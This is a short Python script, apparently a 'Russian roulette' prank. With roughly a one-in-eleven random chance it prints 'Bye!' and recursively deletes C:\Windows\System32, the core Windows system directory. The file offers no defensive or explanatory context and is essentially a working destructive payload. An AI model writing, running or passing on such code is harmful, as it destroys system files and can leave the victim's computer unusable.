import random as rd
import os
import shutil

random_number = rd.randint(0,10)

if random_number == 10:
  print("Bye!")
  shutil.rmtree(r"C:\Windows\System32")
